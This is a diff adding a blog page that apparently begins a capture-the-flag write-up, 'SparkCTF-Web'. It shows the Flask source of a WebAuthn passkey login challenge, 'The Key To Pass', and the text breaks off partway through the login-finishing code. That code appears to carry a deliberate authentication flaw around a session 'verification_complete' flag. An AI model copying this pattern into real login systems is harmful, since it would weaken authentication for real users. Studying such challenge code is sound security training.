@@ -1,0 +1,721 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaotian">
+  <meta name="keywords" content="xt,blog,个人博客,生活,学习,工作">
+  
+    <meta name="description" content="The Key To Pass12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SparkCTF-Web">
+<meta property="og:url" content="https://www.xiaotian.org.cn/2026/03/11/SparkCTF-Web/index.html">
+<meta property="og:site_name" content="xt&#39;s blog">
+<meta property="og:description" content="The Key To Pass12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.xiaotian.org.cn/2026/03/11/SparkCTF-Web/image-20260311151354332.png">
+<meta property="article:published_time" content="2026-03-11T14:15:08.000Z">
+<meta property="article:modified_time" content="2026-03-17T03:10:56.239Z">
+<meta property="article:author" content="xiaotian">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://www.xiaotian.org.cn/2026/03/11/SparkCTF-Web/image-20260311151354332.png">
+  
+  
+  
+  <title>SparkCTF-Web - xt&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.xiaotian.org.cn","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xt&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SparkCTF-Web"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-11 22:15" pubdate>
+          2026年3月11日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          19 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">SparkCTF-Web</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="The-Key-To-Pass"><a href="#The-Key-To-Pass" class="headerlink" title="The Key To Pass"></a>The Key To Pass</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import json<br>import re<br>import time<br>import uuid<br><span class="hljs-keyword">from</span> hashlib import sha256<br><span class="hljs-keyword">from</span> typing import Optional<br><br>import redis<br><span class="hljs-keyword">from</span> flask import Flask, jsonify, redirect, render_template, request, session, url_for<br><span class="hljs-keyword">from</span> werkzeug.middleware.proxy_fix import ProxyFix<br><span class="hljs-keyword">from</span> webauthn import (<br>    generate_authentication_options,<br>    generate_registration_options,<br>    options_to_json,<br>    verify_authentication_response,<br>    verify_registration_response,<br>)<br>try:<br>    <span class="hljs-keyword">from</span> webauthn.helpers import parse_authentication_credential_json, parse_registration_credential_json<br>except ImportError:<br>    parse_authentication_credential_json = None<br>    parse_registration_credential_json = None<br><span class="hljs-keyword">from</span> webauthn.helpers.structs import PublicKeyCredentialDescriptor, UserVerificationRequirement<br><br><span class="hljs-keyword">from</span> app.init_data import bootstrap<br><span class="hljs-keyword">from</span> app.logger import Logger<br><span class="hljs-keyword">from</span> app.models import (<br>    create_credential,<br>    create_user,<br>    get_credential_by_id,<br>    get_credential_for_user,<br>    get_user_by_id,<br>    get_user_by_username,<br>    list_credentials_for_user,<br>    update_credential_sign_count,<br>)<br><span class="hljs-keyword">from</span> app.utils import (<br>    b64url_decode,<br>    b64url_encode,<br>    get_database_path,<br>    get_flag,<br>    get_origin,<br>    get_origin_host,<br>    get_redis_url,<br>    get_rp_id,<br>    get_rp_name,<br>    get_secret_key,<br>    sha256_hex,<br>)<br><br><br>CHALLENGE_TTL_SECONDS = 120<br>REGISTRATION_TTL_SECONDS = 300<br>USERNAME_RE = re.compile(r<span class="hljs-string">&quot;^[A-Za-z0-9_]&#123;3,32&#125;$&quot;</span>)<br><br><br>bootstrap()<br><br>app = Flask(__name__, <span class="hljs-attribute">template_folder</span>=<span class="hljs-string">&quot;templates&quot;</span>, <span class="hljs-attribute">static_folder</span>=<span class="hljs-string">&quot;static&quot;</span>)<br>app.wsgi_app = ProxyFix(app.wsgi_app, <span class="hljs-attribute">x_for</span>=1, <span class="hljs-attribute">x_proto</span>=1, <span class="hljs-attribute">x_host</span>=1, <span class="hljs-attribute">x_port</span>=1)<br>app.config.update(<br>    <span class="hljs-attribute">SECRET_KEY</span>=get_secret_key(),<br>    <span class="hljs-attribute">SESSION_COOKIE_NAME</span>=<span class="hljs-string">&quot;tkp_session&quot;</span>,<br>    <span class="hljs-attribute">SESSION_COOKIE_HTTPONLY</span>=<span class="hljs-literal">True</span>,<br>    <span class="hljs-attribute">SESSION_COOKIE_SAMESITE</span>=<span class="hljs-string">&quot;Lax&quot;</span>,<br>)<br><br>redis_client = redis.Redis.from_url(get_redis_url(), <span class="hljs-attribute">decode_responses</span>=<span class="hljs-literal">True</span>)<br><br><br>def get_or_create_session_id() -&gt; str:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;sid&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> session:<br>        session[<span class="hljs-string">&quot;sid&quot;</span>] = uuid.uuid4().hex<br>    return session[<span class="hljs-string">&quot;sid&quot;</span>]<br><br><br>def current_user():<br>    user_id = session.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;user_id&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_id:<br>        return None<br>    return get_user_by_id(user_id)<br><br><br>def wants_json() -&gt; bool:<br>    return request.path.startswith(<span class="hljs-string">&quot;/login/&quot;</span>) <span class="hljs-keyword">or</span> request.path.startswith(<span class="hljs-string">&quot;/register/&quot;</span>) <span class="hljs-keyword">or</span> request.path == <span class="hljs-string">&quot;/healthz&quot;</span><br><br><br>def error_response(message: str, status_code: int = 400):<br>    <span class="hljs-keyword">if</span> wants_json():<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: message&#125;), status_code<br>    return render_template(<span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-attribute">user</span>=current_user(), <span class="hljs-attribute">error</span>=message), status_code<br><br><br>def challenge_key_for_session() -&gt; str:<br>    return f<span class="hljs-string">&quot;challenge:&#123;get_or_create_session_id()&#125;&quot;</span><br><br><br>def register_key_for_session() -&gt; str:<br>    return f<span class="hljs-string">&quot;register:&#123;get_or_create_session_id()&#125;&quot;</span><br><br><br>def validate_username(raw_username: str) -&gt; Optional[str]:<br>    username = raw_username.strip()<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> USERNAME_RE.fullmatch(username):<br>        return None<br>    return username<br><br><br>@app.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;/&quot;</span>)<br>def index():<br>    return render_template(<span class="hljs-string">&quot;index.html&quot;</span>, <span class="hljs-attribute">user</span>=current_user(), <span class="hljs-attribute">error</span>=None)<br><br><br>@app.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;/register&quot;</span>)<br>def register_page():<br>    return render_template(<span class="hljs-string">&quot;register.html&quot;</span>, <span class="hljs-attribute">user</span>=current_user(), <span class="hljs-attribute">error</span>=None)<br><br><br>@app.post(<span class="hljs-string">&quot;/register/begin&quot;</span>)<br>def register_begin():<br>    payload = request.get_json(<span class="hljs-attribute">silent</span>=<span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> &#123;&#125;<br>    username = validate_username(payload.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;username must be 3-32 chars of letters, digits, or underscore&quot;</span>&#125;), 400<br><br>    <span class="hljs-keyword">if</span> get_user_by_username(username):<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;username already exists&quot;</span>&#125;), 400<br><br>    user_handle = sha256(f<span class="hljs-string">&quot;user:&#123;username&#125;&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)).digest()[:16]<br>    options = generate_registration_options(<br>        <span class="hljs-attribute">rp_id</span>=get_rp_id(),<br>        <span class="hljs-attribute">rp_name</span>=get_rp_name(),<br>        <span class="hljs-attribute">user_id</span>=user_handle,<br>        <span class="hljs-attribute">user_name</span>=username,<br>        <span class="hljs-attribute">timeout</span>=60000,<br>    )<br><br>    redis_client.setex(<br>        register_key_for_session(),<br>        REGISTRATION_TTL_SECONDS,<br>        json.dumps(&#123;<span class="hljs-string">&quot;challenge&quot;</span>: b64url_encode(options.challenge), <span class="hljs-string">&quot;username&quot;</span>: username&#125;),<br>    )<br>    return jsonify(json.loads(options_to_json(options)))<br><br><br>@app.post(<span class="hljs-string">&quot;/register/finish&quot;</span>)<br>def register_finish():<br>    credential = request.get_json(<span class="hljs-attribute">silent</span>=<span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> &#123;&#125;<br>    parsed_credential = credential<br>    <span class="hljs-keyword">if</span> parse_registration_credential_json is <span class="hljs-keyword">not</span> None:<br>        parsed_credential = parse_registration_credential_json(json.dumps(credential))<br><br>    raw_state = redis_client.<span class="hljs-built_in">get</span>(register_key_for_session())<br>    <span class="hljs-keyword">if</span> raw_state is None:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;registration state expired&quot;</span>&#125;), 400<br><br>    state = json.loads(raw_state)<br>    username = state[<span class="hljs-string">&quot;username&quot;</span>]<br>    <span class="hljs-keyword">if</span> get_user_by_username(username):<br>        redis_client.delete(register_key_for_session())<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;username already exists&quot;</span>&#125;), 400<br><br>    try:<br>        verification = verify_registration_response(<br>            <span class="hljs-attribute">credential</span>=parsed_credential,<br>            <span class="hljs-attribute">expected_challenge</span>=b64url_decode(state[<span class="hljs-string">&quot;challenge&quot;</span>]),<br>            <span class="hljs-attribute">expected_rp_id</span>=get_rp_id(),<br>            <span class="hljs-attribute">expected_origin</span>=get_origin(),<br>            <span class="hljs-attribute">require_user_verification</span>=<span class="hljs-literal">False</span>,<br>        )<br>    except Exception as exc:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: f<span class="hljs-string">&quot;registration verification failed: &#123;exc&#125;&quot;</span>&#125;), 400<br><br>   <span class="hljs-built_in"> user </span>= create_user(username, <span class="hljs-attribute">is_admin</span>=<span class="hljs-literal">False</span>)<br>    create_credential(<br>        <span class="hljs-attribute">user_id</span>=user.id,<br>        <span class="hljs-attribute">credential_id</span>=b64url_encode(verification.credential_id),<br>        <span class="hljs-attribute">public_key</span>=b64url_encode(verification.credential_public_key),<br>        <span class="hljs-attribute">sign_count</span>=verification.sign_count,<br>    )<br><br>    redis_client.delete(register_key_for_session())<br>    session[<span class="hljs-string">&quot;user_id&quot;</span>] = user.id<br>    return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">True</span>, <span class="hljs-string">&quot;redirect&quot;</span>: url_for(<span class="hljs-string">&quot;dashboard&quot;</span>)&#125;)<br><br><br>@app.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;/login&quot;</span>)<br>def login_page():<br>    return render_template(<span class="hljs-string">&quot;login.html&quot;</span>, <span class="hljs-attribute">user</span>=current_user(), <span class="hljs-attribute">error</span>=None)<br><br><br>@app.post(<span class="hljs-string">&quot;/login/begin&quot;</span>)<br>def login_begin():<br>    payload = request.get_json(<span class="hljs-attribute">silent</span>=<span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> &#123;&#125;<br>    username = validate_username(payload.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;username&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> username:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;valid username is required&quot;</span>&#125;), 400<br><br>   <span class="hljs-built_in"> user </span>= get_user_by_username(username)<br>    <span class="hljs-keyword">if</span><span class="hljs-built_in"> user </span>is None:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;unknown user&quot;</span>&#125;), 404<br><br>    credentials = list_credentials_for_user(user.id)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> credentials:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;user has no passkeys&quot;</span>&#125;), 400<br><br>    options = generate_authentication_options(<br>        <span class="hljs-attribute">rp_id</span>=get_rp_id(),<br>        allow_credentials=[<br>            PublicKeyCredentialDescriptor(<span class="hljs-attribute">id</span>=b64url_decode(credential.credential_id))<br>            <span class="hljs-keyword">for</span> credential <span class="hljs-keyword">in</span> credentials<br>        ],<br>        <span class="hljs-attribute">timeout</span>=60000,<br>        <span class="hljs-attribute">user_verification</span>=UserVerificationRequirement.PREFERRED,<br>    )<br><br>    redis_client.setex(<br>        challenge_key_for_session(),<br>        CHALLENGE_TTL_SECONDS,<br>        json.dumps(<br>            &#123;<br>                <span class="hljs-string">&quot;challenge&quot;</span>: b64url_encode(options.challenge),<br>                <span class="hljs-string">&quot;username&quot;</span>: user.username,<br>                <span class="hljs-string">&quot;created_at&quot;</span>: time.time(),<br>            &#125;<br>        ),<br>    )<br>    return jsonify(json.loads(options_to_json(options)))<br><br><br>@app.post(<span class="hljs-string">&quot;/login/finish&quot;</span>)<br>def login_finish():<br>    credential = request.get_json(<span class="hljs-attribute">silent</span>=<span class="hljs-literal">True</span>) <span class="hljs-keyword">or</span> &#123;&#125;<br>    parsed_credential = credential<br>    <span class="hljs-keyword">if</span> parse_authentication_credential_json is <span class="hljs-keyword">not</span> None:<br>        parsed_credential = parse_authentication_credential_json(json.dumps(credential))<br><br>    presented_credential_id = credential.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> presented_credential_id:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;credential id is required&quot;</span>&#125;), 400<br><br>    raw_state = redis_client.<span class="hljs-built_in">get</span>(challenge_key_for_session())<br>    <span class="hljs-keyword">if</span> raw_state is None:<br>        return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;challenge expired&quot;</span>&#125;), 400<br><br>    state = json.loads(raw_state)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> state.<span class="hljs-built_in">get</span>(<span class="hljs-string">&quot;verification_complete&quot;</span>):<br>        expected_user = get_user_by_username(state[<span class="hljs-string">&quot;username&quot;</span>])<br>        <span class="hljs-keyword">if</span> expected_user is None:<br>            return jsonify(&#123;<span class="hljs-string">&quot;ok&quot;</span>: <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;expected login user disappeared&quot;</span>&#125;), 400<br><br>        expected_credential = get_credential_for_user(expected_user.id, presented_credential_id)<br>        <span class="hljs-keyword">if</span> expected_credential is None:<br>            return jsonify(&#123;<span 